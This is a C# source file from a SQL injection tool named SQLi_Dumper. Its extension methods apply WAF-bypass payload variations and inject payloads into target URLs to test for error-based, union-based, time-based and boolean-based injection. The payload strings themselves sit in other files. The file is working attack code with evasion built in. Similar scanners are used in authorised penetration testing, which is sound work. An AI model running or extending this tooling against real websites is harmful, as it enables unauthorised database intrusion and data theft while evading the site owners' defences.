using System;
using System.Collections.Generic;
using System.Linq;
using DataBase;
using SQLi_Dumper.Core;

namespace SQLi_Dumper.Core
{
    /// <summary>
    /// Extension methods for the existing Analyzer class to integrate Core functionality
    /// These methods provide enhanced capabilities while maintaining backward compatibility
    /// </summary>
    public static class AnalyzerExtensions
    {
        /// <summary>
        /// Enhanced error detection using new Core error signatures
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="response">HTTP response content</param>
        /// <returns>Detected database type</returns>
        public static Types DetectDatabaseFromResponse(this Analyzer analyzer, string response)
        {
            return CoreIntegration.DetectDatabaseFromResponse(response);
        }

        /// <summary>
        /// Get enhanced payloads for current database type
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="category">Payload category</param>
        /// <returns>List of payloads</returns>
        public static List<string> GetEnhancedPayloads(this Analyzer analyzer, Payloads.PayloadCategory category)
        {
            return CoreIntegration.GetPayloadsForAnalyzer(analyzer.DBType, category);
        }

        /// <summary>
        /// Apply WAF bypass techniques to payload
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="payload">Original payload</param>
        /// <param name="maxVariations">Maximum variations to generate</param>
        /// <returns>List of bypass variations</returns>
        public static List<string> ApplyWAFBypass(this Analyzer analyzer, string payload, int maxVariations = 10)
        {
            return CoreIntegration.ApplyWAFBypass(payload, analyzer.DBType, maxVariations);
        }

        /// <summary>
        /// Check if current database supports specific detection method
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="method">Detection method</param>
        /// <returns>True if supported</returns>
        public static bool SupportsDetectionMethod(this Analyzer analyzer, DetectionMethods.DetectionType method)
        {
            return CoreIntegration.SupportsDetectionMethod(analyzer.DBType, method);
        }

        /// <summary>
        /// Get all available detection methods for current database
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <returns>List of detection methods</returns>
        public static List<DetectionMethods.DetectionMethod> GetAvailableDetectionMethods(this Analyzer analyzer)
        {
            return CoreIntegration.GetDetectionMethods(analyzer.DBType);
        }

        /// <summary>
        /// Enhanced SQL injection vulnerability check
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="response">HTTP response</param>
        /// <returns>True if vulnerability indicators found</returns>
        public static bool ContainsSQLInjectionIndicators(this Analyzer analyzer, string response)
        {
            return CoreIntegration.ContainsSQLInjectionIndicators(response);
        }

        /// <summary>
        /// Get error signatures for current database type
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <returns>List of error signatures</returns>
        public static List<ErrorSignatures.ErrorSignature> GetErrorSignatures(this Analyzer analyzer)
        {
            return CoreIntegration.GetErrorSignatures(analyzer.DBType);
        }

        /// <summary>
        /// Get friendly name for current database type
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <returns>Friendly database name</returns>
        public static string GetFriendlyDatabaseName(this Analyzer analyzer)
        {
            return CoreIntegration.GetFriendlyName(analyzer.DBType);
        }

        /// <summary>
        /// Enhanced error-based injection test
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="url">Target URL</param>
        /// <returns>True if error-based injection is possible</returns>
        public static bool TryEnhancedErrorBased(this Analyzer analyzer, string url)
        {
            var payloads = CoreIntegration.GetErrorBasedPayloads(analyzer.DBType);
            
            foreach (var payload in payloads.Take(10)) // Limit to first 10 payloads
            {
                try
                {
                    var testUrl = url.Replace("[t]", payload);
                    var response = analyzer.HTML_Load(testUrl);
                    
                    if (CoreIntegration.ContainsSQLInjectionIndicators(response))
                    {
                        return true;
                    }
                }
                catch (Exception)
                {
                    // Continue with next payload
                    continue;
                }
            }
            
            return false;
        }

        /// <summary>
        /// Enhanced union-based injection test
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="url">Target URL</param>
        /// <returns>True if union-based injection is possible</returns>
        public static bool TryEnhancedUnionBased(this Analyzer analyzer, string url)
        {
            var payloads = CoreIntegration.GetUnionBasedPayloads(analyzer.DBType);
            
            foreach (var payload in payloads.Take(10)) // Limit to first 10 payloads
            {
                try
                {
                    var testUrl = url.Replace("[t]", payload);
                    var response = analyzer.HTML_Load(testUrl);
                    
                    // Check for union-based injection indicators
                    if (!string.IsNullOrEmpty(response) && 
                        (response.Contains("null", StringComparison.OrdinalIgnoreCase) ||
                         response.Contains("union", StringComparison.OrdinalIgnoreCase) ||
                         response.Contains("select", StringComparison.OrdinalIgnoreCase)))
                    {
                        return true;
                    }
                }
                catch (Exception)
                {
                    // Continue with next payload
                    continue;
                }
            }
            
            return false;
        }

        /// <summary>
        /// Enhanced time-based injection test
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="url">Target URL</param>
        /// <returns>True if time-based injection is possible</returns>
        public static bool TryEnhancedTimeBased(this Analyzer analyzer, string url)
        {
            var payloads = CoreIntegration.GetTimeBasedPayloads(analyzer.DBType);
            
            foreach (var payload in payloads.Take(5)) // Limit to first 5 payloads for time-based
            {
                try
                {
                    var testUrl = url.Replace("[t]", payload);
                    var startTime = DateTime.Now;
                    var response = analyzer.HTML_Load(testUrl);
                    var endTime = DateTime.Now;
                    var duration = endTime - startTime;
                    
                    // Check if response took longer than expected (indicating time-based injection)
                    if (duration.TotalSeconds > 4) // Allow some tolerance
                    {
                        return true;
                    }
                }
                catch (Exception)
                {
                    // Continue with next payload
                    continue;
                }
            }
            
            return false;
        }

        /// <summary>
        /// Enhanced boolean-based injection test
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="url">Target URL</param>
        /// <returns>True if boolean-based injection is possible</returns>
        public static bool TryEnhancedBooleanBased(this Analyzer analyzer, string url)
        {
            var payloads = CoreIntegration.GetBooleanBasedPayloads(analyzer.DBType);
            
            // Test true and false conditions
            var truePayloads = payloads.Where(p => p.Contains("1=1") || p.Contains("'a'='a'")).Take(3);
            var falsePayloads = payloads.Where(p => p.Contains("1=2") || p.Contains("'a'='b'")).Take(3);
            
            foreach (var truePayload in truePayloads)
            {
                foreach (var falsePayload in falsePayloads)
                {
                    try
                    {
                        var trueUrl = url.Replace("[t]", truePayload);
                        var falseUrl = url.Replace("[t]", falsePayload);
                        
                        var trueResponse = analyzer.HTML_Load(trueUrl);
                        var falseResponse = analyzer.HTML_Load(falseUrl);
                        
                        // Check if responses are different (indicating boolean-based injection)
                        if (!string.IsNullOrEmpty(trueResponse) && !string.IsNullOrEmpty(falseResponse) &&
                            trueResponse.Length != falseResponse.Length)
                        {
                            return true;
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next payload combination
                        continue;
                    }
                }
            }
            
            return false;
        }

        /// <summary>
        /// Comprehensive enhanced SQL injection test
        /// </summary>
        /// <param name="analyzer">Analyzer instance</param>
        /// <param name="url">Target URL</param>
        /// <returns>Dictionary with test results for different methods</returns>
        public static Dictionary<string, bool> RunEnhancedTests(this Analyzer analyzer, string url)
        {
            var results = new Dictionary<string, bool>();
            
            try
            {
                results["Error-Based"] = analyzer.TryEnhancedErrorBased(url);
                results["Union-Based"] = analyzer.TryEnhancedUnionBased(url);
                results["Time-Based"] = analyzer.TryEnhancedTimeBased(url);
                results["Boolean-Based"] = analyzer.TryEnhancedBooleanBased(url);
            }
            catch (Exception)
            {
                // Return empty results if tests fail
                results["Error-Based"] = false;
                results["Union-Based"] = false;
                results["Time-Based"] = false;
                results["Boolean-Based"] = false;
            }
            
            return results;
        }
    }
}